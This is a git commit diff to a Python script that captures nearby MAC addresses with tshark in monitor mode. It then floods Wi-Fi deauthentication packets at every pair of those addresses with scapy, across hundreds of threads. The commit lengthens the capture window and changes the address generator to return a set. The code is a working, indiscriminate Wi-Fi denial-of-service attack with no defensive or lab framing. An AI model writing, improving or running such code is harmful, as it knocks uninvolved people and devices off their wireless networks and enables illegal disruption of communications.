9c98c50466177d07bd0d9eca4224cfa8c340a6e7
Hisu Han <58086385+SHLEAK@users.noreply.github.com>
2023-05-26 09:29:00 +0900

    Update docking.py

--- docking.py
+++ docking.py
@@ -15,12 +15,12 @@ def deauth(target_mac, access_point_mac):
         Dot11Deauth()
     )
     sendp(pkt, inter=interval, count=packet_count, verbose=0)
-def maccy():
+def everything():
     disconnect_cmd = "networksetup -setairportpower en0 off"
     subprocess.run(disconnect_cmd, shell=True)
     disconnect_cmd = "networksetup -setairportpower en0 on"
     subprocess.run(disconnect_cmd, shell=True)
-    tshark_cmd = "tshark -i en0 -I -a duration:10"
+    tshark_cmd = "tshark -i en0 -I -a duration:60"
     tshark_process = subprocess.Popen(tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     mac_regex = r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"
     mac_addresses = []
@@ -33,11 +33,11 @@ def maccy():
     subprocess.run(disconnect_cmd, shell=True)
     disconnect_cmd = "networksetup -setairportpower en0 on"
     subprocess.run(disconnect_cmd, shell=True)
-    for mac in set(mac_addresses):
-        yield mac
-with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
-    for wifi in maccy():
-        for device in maccy():
+    return set(mac_addresses)
+maccy=everything()
+with concurrent.futures.ThreadPoolExecutor(max_workers=800) as executor:
+    for wifi in maccy:
+        for device in maccy:
             try:
                 executor.submit(deauth, device, wifi)
             except Exception as e:
